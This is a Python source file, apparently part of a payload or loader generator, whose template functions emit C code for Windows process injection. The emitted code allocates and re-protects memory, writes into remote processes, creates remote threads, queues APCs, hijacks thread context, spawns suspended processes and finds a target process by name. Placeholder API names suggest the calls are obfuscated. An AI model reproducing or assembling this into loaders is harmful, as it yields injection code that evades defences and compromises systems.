from string import Template
from pathlib import Path, PureWindowsPath
import os

def VirtualProtect(lpAddress, dwSize, flNewProtect):
    return Template("""
    DWORD oldProtect_$n;
    {VirtualProtect}($lpAddress, $dwSize, $flNewProtect, &oldProtect_$n);
""").substitute(lpAddress=lpAddress, dwSize=dwSize, flNewProtect=flNewProtect, n=os.urandom(4).hex())
    
def VirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect):
    return Template("""
    DWORD oldProtect;
    {VirtualProtectEx}($hProcess, $lpAddress, $dwSize, $flNewProtect, &oldProtect);
""").substitute(hProcess=hProcess, lpAddress=lpAddress, dwSize=dwSize, flNewProtect=flNewProtect)

def NtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize, NewProtection):
    return Template("""
    SIZE_T size = $RegionSize;
    ULONG OldProtect; 
    {NtProtectVirtualMemory}($ProcessHandle, &$BaseAddress, &size, $NewProtection, &OldProtect);
""").substitute(ProcessHandle=ProcessHandle, BaseAddress=BaseAddress, RegionSize=RegionSize, NewProtection=NewProtection )

def VirtualAllocEx(output, hProcess, dwSize, flAllocationType, flProtect):
    return Template("""
    LPVOID $output = {VirtualAllocEx}($hProcess, NULL, $dwSize, $flAllocationType, $flProtect);
""").substitute(output=output, hProcess=hProcess, dwSize=dwSize, flAllocationType=flAllocationType, flProtect=flProtect)

def VirtualAlloc(output, dwSize, flAllocationType, flProtect):
    return Template("""
    LPVOID $output = {VirtualAlloc}(NULL, $dwSize, $flAllocationType, $flProtect);
""").substitute(output=output, dwSize=dwSize, flAllocationType=flAllocationType, flProtect=flProtect)

def HeapAlloc(output, dwFlags, dwBytes):
    return Template("""
    HANDLE hHeap = {HeapCreate}(0, $dwBytes, 0);
    LPVOID $output = {HeapAlloc}(hHeap, $dwFlags, $dwBytes);       
""").substitute(output=output, dwBytes=dwBytes, dwFlags=dwFlags)

def NtAllocateVirtualMemory(output, ProcessHandle, RegionSize, AllocationType, PageProtection):
    return Template("""
    PVOID $output = NULL;
    SIZE_T allocationSize_$n = $RegionSize;
    {NtAllocateVirtualMemory}($ProcessHandle, &$output, 0, &allocationSize_$n, $AllocationType, $PageProtection);
""").substitute(output=output, ProcessHandle=ProcessHandle, RegionSize=RegionSize, AllocationType=AllocationType, PageProtection=PageProtection, n=os.urandom(4).hex())

def CreateThread(output, lpStartAddress):
    return Template("""
    HANDLE $output = {CreateThread}(NULL, 0, (LPTHREAD_START_ROUTINE)$lpStartAddress, NULL, 0, NULL);
""").substitute(output=output, lpStartAddress=lpStartAddress)

def NtCreateThreadEx(output, ProcessHandle, lpStartAddress):
    return Template("""
    HANDLE $output;
    {NtCreateThreadEx}(&$output, THREAD_ALL_ACCESS, NULL, $ProcessHandle, (PVOID)$lpStartAddress, NULL, 0, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);
""").substitute(output=output, ProcessHandle=ProcessHandle, lpStartAddress=lpStartAddress)

def memcpy(destination, source, length):
    return Template("""
    memcpy($destination, $source, $length);
""").substitute(destination=destination,source=source,length=length)

def NtWriteVirtualMemory(ProcessHandle, destination, source, length):
    return Template("""
    SIZE_T bytesWritten_$n = 0;
    {NtWriteVirtualMemory}($ProcessHandle, $destination, $source, $length, &bytesWritten_$n);
""").substitute(destination=destination,ProcessHandle=ProcessHandle,source=source,length=length, n=os.urandom(4).hex())

def WriteProcessMemory(ProcessHandle, destination, source, length):
    return Template("""
    {WriteProcessMemory}($ProcessHandle, $destination, (PVOID)$source, (SIZE_T)$length, (SIZE_T *)NULL);
""").substitute(destination=destination,ProcessHandle=ProcessHandle,source=source,length=length)

def WaitForSingleObject(hHandle, dwMilliseconds):
    return Template("""
    {WaitForSingleObject}($hHandle, $dwMilliseconds);             
""").substitute(hHandle=hHandle, dwMilliseconds=dwMilliseconds)

def NtWaitForSingleObject(hHandle, dwMilliseconds):
    return Template("""
    LARGE_INTEGER li = {{ 0 }};
    li.QuadPart = $dwMilliseconds;
    {NtWaitForSingleObject}($hHandle, FALSE, NULL);             
""").substitute(hHandle=hHandle, dwMilliseconds=dwMilliseconds)

def CloseHandle(hHandle):
    return Template ("""
    {CloseHandle}($hHandle);
""").substitute(hHandle=hHandle)

def NtClose(hHandle):
    return Template ("""
    {NtClose}($hHandle);
""").substitute(hHandle=hHandle)

def HeapFree(hHeap, lpMem):
    return Template("""
    {HeapFree}($hHeap, 0, $lpMem);
    {HeapDestroy}($hHeap);
""").substitute(hHeap=hHeap, lpMem=lpMem)

def VirtualFree(lpAddress):
    return Template("""
    {VirtualFree}($lpAddress, 0, MEM_RELEASE);
""").substitute(lpAddress=lpAddress)

def NtFreeVirtualMemory(ProcessHandle, lpAddress):
    return Template("""
    {NtFreeVirtualMemory}($ProcessHandle, $lpAddress, 0, MEM_RELEASE);
""").substitute(ProcessHandle=ProcessHandle, lpAddress=lpAddress)

def CreateProcessA(target):
    return Template("""
    STARTUPINFOA si = {{
        sizeof(si)
    }}; 
    PROCESS_INFORMATION pi; 

    {CreateProcessA}(NULL, (LPSTR) "$target", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;                
""").substitute(target=target)

def NtCreateUserProcess(target):
    parsed = PureWindowsPath(target)
    curdir = str(parsed.parent).replace('\\','\\\\')
    image = str(parsed.name).replace('\\','\\\\')
    return Template("""
    UNICODE_STRING image = RTL_CONSTANT_STRING(L"$target");
    UNICODE_STRING cmdline = RTL_CONSTANT_STRING(L"$image");
    UNICODE_STRING curdir = RTL_CONSTANT_STRING(L"$curdir");
    UNICODE_STRING desktop = RTL_CONSTANT_STRING(L"WinSta0\\\\Default");
    WCHAR kNtImage[] = L"\\\\??\\\\$target";
    
    PRTL_USER_PROCESS_PARAMETERS procParams = NULL;
    PS_CREATE_INFO createInfo    = {{ sizeof(createInfo) }};     /* State defaults to initial */
    PS_ATTRIBUTE_LIST attrList = {{ sizeof(attrList) }};  /* room for exactly one */
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    LPWCH  env;
 
    attrList.Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    attrList.Attributes[0].Size      = sizeof(kNtImage) - sizeof(WCHAR);
    attrList.Attributes[0].ValuePtr  = (PVOID)kNtImage;

    env = GetEnvironmentStringsW();
 
    {RtlCreateProcessParametersEx}(&procParams, &image, NULL, &curdir, &cmdline, env, NULL, &desktop, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
 
    {NtCreateUserProcess}(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, procParams, &createInfo, &attrList);
""").substitute(target=target, image=image, curdir=curdir)

def CreateRemoteThread(output, hProcess, lpStartAddress, lpParameter='NULL'):
    return Template("""
    HANDLE $output = {CreateRemoteThread}($hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)$lpStartAddress, $lpParameter, 0, NULL);
    """).substitute(output=output, hProcess=hProcess, lpStartAddress=lpStartAddress, lpParameter=lpParameter)

def QueueUserAPC(pfnAPC, hThread):
    return Template("""
    {QueueUserAPC}((PAPCFUNC)$pfnAPC, $hThread, (ULONG_PTR)NULL);
""").substitute(pfnAPC=pfnAPC, hThread=hThread)

def ResumeThread(hThread):
    return Template("""
    {ResumeThread}($hThread);                 
""").substitute(hThread=hThread)

def GetThreadContext(output, hThread):
    return Template("""
    CONTEXT $output = {{ 0 }};
    $output.ContextFlags = CONTEXT_CONTROL; // e.g., RIP/RSP/EBP
    {GetThreadContext}($hThread, &$output);
""").substitute(hThread=hThread, output=output)

def SetThreadContext(context, hThread):
    return Template("""
    {SetThreadContext}($hThread, &$context);
""").substitute(hThread=hThread, context=context)

def NtCreateThreadEx(output, hProcess, lpStartAddress, lpParameter='NULL'):
    return Template("""
    HANDLE $output;
    {NtCreateThreadEx}(&$output, THREAD_ALL_ACCESS, NULL, $hProcess, (PVOID)$lpStartAddress, $lpParameter, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);
""").substitute(output=output, hProcess=hProcess, lpStartAddress=lpStartAddress, lpParameter=lpParameter)

def NtQueueApcThread(hThread, pfnAPC):
    return Template("""
    {NtQueueApcThread}($hThread, $pfnAPC, NULL, NULL, 0);
""").substitute(pfnAPC=pfnAPC, hThread=hThread)

def LoadLibraryExA(output, lpLibfileName, dwFlags):
    return Template("""
    HMODULE $output  = {LoadLibraryExA}( "$lpLibfileName", NULL, DONT_RESOLVE_DLL_REFERENCES );
""").substitute(output=output, lpLibfileName=lpLibfileName, dwFlags=dwFlags)

def FindProcess(target):
    return Template("""
    int pid = 0;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
            
    hProcSnap = {CreateToolhelp32Snapshot}(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
            
    pe32.dwSize = sizeof(PROCESSENTRY32); 
            
    if (!{Process32First}(hProcSnap, &pe32)) {{
            CloseHandle(hProcSnap);
            return 0;
    }}
            
    while ({Process32Next}(hProcSnap, &pe32)) {{
        if (lstrcmpiA("$target", pe32.szExeFile) == 0) {{
                pid = pe32.th32ProcessID;
                break;
        }}
    }}
            
    {CloseHandle}(hProcSnap);

    // try to open target process
    hProcess = {OpenProcess}( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD) pid);

    THREADENTRY32 thEntry;
    thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = {CreateToolhelp32Snapshot}(TH32CS_SNAPTHREAD, 0);

    while ({Thread32Next}(Snap, &thEntry))
    {{
        if (thEntry.th32OwnerProcessID == pid)
        {{
            hThread = {OpenThread}(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
            break;
        }}
    }}
    CloseHandle(Snap);
""").substitute(target=target)

def SuspendThread(hThread):
    return Template("""
    {SuspendThread}($hThread);
""").substitute(hThread=hThread)